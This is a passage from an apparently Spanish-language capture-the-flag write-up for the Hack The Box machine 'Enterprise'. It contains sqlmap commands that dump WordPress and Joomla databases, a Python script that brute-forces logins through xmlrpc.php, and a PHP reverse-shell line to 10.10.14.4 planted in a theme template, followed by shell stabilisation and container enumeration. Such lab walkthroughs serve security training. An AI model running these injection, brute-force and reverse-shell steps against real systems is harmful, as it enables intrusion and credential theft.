</span></span></code></pre></div><p>Sqlmap nos confirma que es vulnerable y nos dice los 3 tipos de SQLI que se pueden usar</p><ul><li>boolean-based blind</li><li>error-based</li><li>time-based blind</li></ul><p>Para enumerar las bases de datos vamos a usar el parametro <code>--dbs</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>sqlmap</span> <span class=o>--</span><span class=nx>url</span> <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> <span class=o>--</span><span class=nx>batch</span> <span class=o>--</span><span class=nx>dbs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>available</span> <span class=nx>databases</span> <span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>information_schema</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>joomla</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>joomladb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>mysql</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>performance_schema</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>sys</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>wordpress</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>wordpressdb</span>
</span></span></code></pre></div><p>Una vez que ya sabemos que bases de datos hay vamos a ver que tablas hay de la base de datos del wordpress, para ello con <code>-D</code> vamos a especificar la base de datos y con <code>--tables</code> vamos a listar las tablas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>sqlmap</span> <span class=o>--</span><span class=nx>url</span> <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> <span class=o>--</span><span class=nx>batch</span> <span class=o>-</span><span class=nx>D</span> <span class=nx>wordpress</span> <span class=o>--</span><span class=nx>tables</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Database</span><span class=o>:</span> <span class=nx>wordpress</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span> <span class=nx>tables</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>+-----------------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_commentmeta</span>        <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_comments</span>           <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_links</span>              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_options</span>            <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_postmeta</span>           <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_posts</span>              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_term_relationships</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_term_taxonomy</span>      <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_termmeta</span>           <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_terms</span>              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_usermeta</span>           <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>wp_users</span>              <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+-----------------------+</span>
</span></span></code></pre></div><p>Ahora vamos a sacar toda la información de la tabla wp_users, para especificar la tabla vamos a usar <code>-T</code> y para ver el contenido <code>--dump</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>sqlmap</span> <span class=o>--</span><span class=nx>url</span> <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> <span class=o>--</span><span class=nx>batch</span> <span class=o>-</span><span class=nx>D</span> <span class=nx>wordpress</span> <span class=o>-</span><span class=nx>T</span> <span class=nx>wp_users</span> <span class=o>--</span><span class=nx>dump</span>
</span></span><span class=line><span class=cl>                                                 
</span></span><span class=line><span class=cl><span class=nx>Database</span><span class=o>:</span> <span class=nx>wordpress</span>
</span></span><span class=line><span class=cl><span class=nx>Table</span><span class=o>:</span> <span class=nx>wp_users</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span> <span class=nx>entry</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=nx>ID</span> <span class=o>|</span> <span class=nx>user_url</span> <span class=o>|</span> <span class=nx>user_pass</span>                          <span class=o>|</span> <span class=nx>user_email</span>                   <span class=o>|</span> <span class=nx>user_login</span>    <span class=o>|</span> <span class=nx>user_status</span> <span class=o>|</span> <span class=nx>display_name</span>  <span class=o>|</span> <span class=nx>user_nicename</span> <span class=o>|</span> <span class=nx>user_registered</span>     <span class=o>|</span> <span class=nx>user_activation_key</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=mi>1</span>  <span class=o>|</span> <span class=o>&lt;</span><span class=nx>blank</span><span class=o>&gt;</span>  <span class=o>|</span> <span class=nx>$P$BFf47EOgXrJB3ozBRZkjYcleng2Q</span><span class=p>.</span><span class=mf>2.</span> <span class=o>|</span> <span class=nx>william</span><span class=p>.</span><span class=nx>riker</span><span class=err>@</span><span class=nx>enterprise</span><span class=p>.</span><span class=nx>htb</span> <span class=o>|</span> <span class=nx>william</span><span class=p>.</span><span class=nx>riker</span> <span class=o>|</span> <span class=mi>0</span>           <span class=o>|</span> <span class=nx>william</span><span class=p>.</span><span class=nx>riker</span> <span class=o>|</span> <span class=nx>william</span><span class=o>-</span><span class=nx>riker</span> <span class=o>|</span> <span class=mi>2017</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>03</span> <span class=mi>19</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=mi>56</span> <span class=o>|</span> <span class=o>&lt;</span><span class=nx>blank</span><span class=o>&gt;</span>             <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+</span>
</span></span></code></pre></div><p>Ya podemos confirmat la exisistencia del usuario <strong>william.riker</strong> y tenemos su contraseña hasheada: <code>$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.</code>. Este hash lo podemos intentar romper de la siguiente forma.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.&#39;</span> &gt; <span class=nb>hash</span>
</span></span><span class=line><span class=cl>                                                                                                     
</span></span><span class=line><span class=cl>john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt <span class=nb>hash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>phpass <span class=o>[</span>phpass <span class=o>(</span><span class=nv>$P</span>$ or <span class=nv>$H</span>$<span class=o>)</span> 256/256 AVX2 8x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>8192</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>2</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span></code></pre></div><p>Lo deje corriendo un buen rato y nada, no puede sacar la pass, asi que vamos a seguir enumerando la base de datos. Vamos a ver el contenido de la tabla wp_posts</p><p>En la columna post_content vemos que hay 3 entradas que contienen el siguiente texto</p><pre tabindex=0><code>Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n
</code></pre><p>Para que interprete los enters podemos usar python:</p><pre tabindex=0><code>$python3

&gt;&gt;&gt; print(&#39;Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n&#39;)


Needed somewhere to put some passwords quickly

ZxJyhGem4k338S2Y

enterprisencc170

ZD3YxfnSjezg67JZ

u*Z14ru0p#ttj83zS6
</code></pre><p>Parece que ya tenemos 4 contraseñas que alomejor son las del wordpress. No las vamos a probar una a una, vamos a hacer fuerza bruta automatizada de 3 formas distinatas</p><hr><p>Este wordpress tiene el xmlrpc.php accessible asi que nos podemos aprovechar de el para hacer la fuerza burta. Primero vamos a listar los metodos que tiene disponibles, mandandole una peticion por post con la siguiente data</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;methodCall&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;methodName&gt;</span>system.listMethods<span class=nt>&lt;/methodName&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;params&gt;&lt;/params&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;/methodCall&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST <span class=s2>&#34;http://enterprise.htb/xmlrpc.php&#34;</span> -d@data.xml
</span></span><span class=line><span class=cl>&lt;?xml <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span>?&gt;
</span></span><span class=line><span class=cl>&lt;methodResponse&gt;
</span></span><span class=line><span class=cl>  &lt;params&gt;
</span></span><span class=line><span class=cl>    &lt;param&gt;
</span></span><span class=line><span class=cl>      &lt;value&gt;
</span></span><span class=line><span class=cl>      &lt;array&gt;&lt;data&gt;
</span></span><span class=line><span class=cl>  .....
</span></span><span class=line><span class=cl>  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
</span></span><span class=line><span class=cl>  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
</span></span><span class=line><span class=cl>  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
</span></span><span class=line><span class=cl>  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
</span></span><span class=line><span class=cl>  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
</span></span><span class=line><span class=cl>&lt;/data&gt;&lt;/array&gt;
</span></span><span class=line><span class=cl>      &lt;/value&gt;
</span></span><span class=line><span class=cl>    &lt;/param&gt;
</span></span><span class=line><span class=cl>  &lt;/params&gt;
</span></span><span class=line><span class=cl>&lt;/methodResponse&gt;
</span></span></code></pre></div><p>El metodo <code>wp.getUsersBlogs</code> esta disponible, con este metodo podemos hacer fuerza bruta con la siguiente data sustituyendo el parametro username por el usuario y password por la contraseña</p><pre tabindex=0><code>&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-8\&#34;?&gt;
&lt;methodCall&gt; 
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; 
&lt;params&gt; 
&lt;param&gt;&lt;value&gt;USERNAME&lt;/value&gt;&lt;/param&gt; 
&lt;param&gt;&lt;value&gt;PASSWORD&lt;/value&gt;&lt;/param&gt; 
&lt;/params&gt; 
&lt;/methodCall&gt;
</code></pre><p>Al mandar esta petición recibimos lo siguiente</p><p>curl -X POST &ldquo;http://enterprise.htb/xmlrpc.php&rdquo; -d@data.xml</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;methodResponse&gt;</span>
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>          <span class=nt>&lt;value&gt;&lt;string&gt;</span>Incorrect username or password.<span class=nt>&lt;/string&gt;&lt;/value&gt;</span>
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl><span class=nt>&lt;/methodResponse&gt;</span>
</span></span></code></pre></div><p>Ahora vamos a hacer un script en python para automatizar esta comprovación de usuarios y guardaremos todos las contraseñas en un archivo llamado passwords.txt</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://enterprise.htb/xmlrpc.php&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>dict</span> <span class=o>=</span> <span class=s2>&#34;passwords.txt&#34;</span>
</span></span><span class=line><span class=cl><span class=n>user</span> <span class=o>=</span> <span class=s2>&#34;william.riker&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;methodCall&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;params&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;param&gt;&lt;value&gt;</span><span class=si>{}</span><span class=s2>&lt;/value&gt;&lt;/param&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;param&gt;&lt;value&gt;</span><span class=si>{}</span><span class=s2>&lt;/value&gt;&lt;/param&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/params&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/methodCall&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Numero de contraseñas probadas&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Contraseña&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>words</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=nb>dict</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>diccionario</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>diccionario</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>words</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>words</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>a</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>user</span><span class=p>,</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;Incorrect username or password&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>a</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>p2</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>p1</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>words</span><span class=p>)</span>
</span></span></code></pre></div><p>Al principio del script de declaran 4 variables, la url con la ruta del xmlrpc.php, el diccionario de possibles contraseñas, el usuario con el cual se van a probar las contraseñas y la data que se va a mandar por post, con unos &ldquo;{}&rdquo; donde iria el user y la pass, indicando que ahi va a ir una variable que haremos mas adelante. Despues abrimos el diccionario y hacemos un bucle for por cada linea que haya en el diccionario. A continuación se manda una solicitud con la contraseña que toca en la iteración del diccionario y se comprueba si la respuesta contiene la frase &ldquo;Incorrect username or password&rdquo;. Si no contiene esa frase significa que las credenciales son correctas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 script.py
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Numero de contraseñas probadas: <span class=m>4</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Contraseña: u*Z14ru0p#ttj83zS6
</span></span></code></pre></div><p>Ahora ya tenemos la contraseña del wordpress y podemos iniciar sessión en /wp-admin, una vez iniciada la sessión para mandarnos una reverse shell simplemente vamos a Appearance > Editor > 404 template. Vamos a modificar el 404.php que es el que se muestra cuando vamos a una ruta equivocada y vamos a añadir la siguiente linea</p><pre tabindex=0><code>system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.4/443 0&gt;&amp;1&#34;&#39;);
</code></pre><p>Nos ponemos en escucha con netcat</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>Por ultimo hacemos un curl a un post que no exsista</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://enterprise.htb/?p<span class=o>=</span><span class=m>10000000</span>
</span></span></code></pre></div><p>Y recbimos la conexión</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.4<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.61<span class=o>]</span> <span class=m>32890</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@b8319d86d21e:/var/www/html$ 
</span></span></code></pre></div><p>Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset xterm
</span></span></code></pre></div><p>Ahora si hacemos un <code>echo $TERM</code> vemos que vale dumb pero para poder hacer <code>ctrl + l</code> necesitamos que valga xterm</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Por ultimo si miramos la shell que tenemos <code>echo $SHELL</code> vemos que tenemos <code>/usr/sbin/nologin</code> asi que vamos a asignar una bash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><p>Al ver nuestra ip vemos que no es la de la máquina victima:</p><pre tabindex=0><code>www-data@b8319d86d21e:/var/www/html$ ip a

1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre><p>Si listamos el contenido de la raiz vemos que estamos en un contenedor docker por la exsistencia del archivo .dockerenv</p><pre tabindex=0><code>www-data@b8319d86d21e:/var/www/html$ ls -la /

total 72
drwxr-xr-x  73 root root 4096 May 30  2022 .
drwxr-xr-x  73 root root 4096 May 30  2022 ..
-rwxr-xr-x   1 root root    0 Sep  3  2017 .dockerenv
</code></pre><p>Volviendo al tema de la ip hemos visto que tenemos la 172.17.0.3 la 172.17.0.1 es la máquina host que seguramente sera la 10.10.10.61. Pero es raro que se nos haya asignado la ip 172.17.0.3 y no la 172.17.0.2, puede ser que haya mas de un contenedor docker y que en la .2 haya un contenedor. Esto lo podemos comprobar con un ping.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@b8319d86d21e:/var/www/html$ ping -c <span class=m>1</span> 172.17.0.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PING 172.17.0.2 <span class=o>(</span>172.17.0.2<span class=o>)</span>: <span class=m>56</span> data bytes
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 172.17.0.2: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>0</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.061 ms
</span></span><span class=line><span class=cl>--- 172.17.0.2 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> packets received, 0% packet loss
</span></span><span class=line><span class=cl>round-trip min/avg/max/stddev <span class=o>=</span> 0.061/0.061/0.061/0.000 ms
</span></span></code></pre></div><p>Efecticamente exsiste un contenedor en la .2. Si volvemos al inicio, habia una tercera web corriendo por el puerto 8080, antes de entrar vamos a hacerle un whatweb como la de wordpress para ver que es.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whatweb 10.10.10.61:8080
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.10.10.61:8080 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.10<span class=o>]</span>, Bootstrap, Cookies<span class=o>[</span>14cd8f365a67fad648754407628a1809<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Debian Linux<span class=o>][</span>Apache/2.4.10 <span class=o>(</span>Debian<span class=o>)]</span>, HttpOnly<span class=o>[</span>14cd8f365a67fad648754407628a1809<span class=o>]</span>, IP<span class=o>[</span>10.10.10.61<span class=o>]</span>, JQuery, MetaGenerator<span class=o>[</span>Joomla! - Open Source Content Management<span class=o>]</span>, PHP<span class=o>[</span>7.0.23<span class=o>]</span>, PasswordField<span class=o>[</span>password<span class=o>]</span>, Script<span class=o>[</span>application/json<span class=o>]</span>, Title<span class=o>[</span>Home<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/7.0.23<span class=o>]</span>
</span></span></code></pre></div><p>Es un joomla! si recordamos en la sqli de wordpress habia una base de datos de joomla asi que podemos sacar usuarios y contraseñas. Primero enumeramos las tablas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap --url <span class=s2>&#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#34;</span> --batch -D joomladb --tables
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database: joomladb
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>72</span> tables<span class=o>]</span>
</span></span><span class=line><span class=cl>+-------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_assets                  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_associations            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_banner_clients          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_banner_tracks           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_banners                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_categories              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_contact_details         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_content                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_content_frontpage       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_content_rating          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_content_types           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_contentitem_tag_map     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_core_log_searches       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_extensions              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_fields                  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_fields_categories       <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_fields_groups           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_fields_values           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_filters          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms0     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms1     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms2     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms3     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms4     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms5     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms6     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms7     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms8     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_terms9     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termsa     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termsb     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termsc     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termsd     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termse     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_links_termsf     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_taxonomy         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_taxonomy_map     <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> edz2g_finder_terms            <span class=p>|</span>
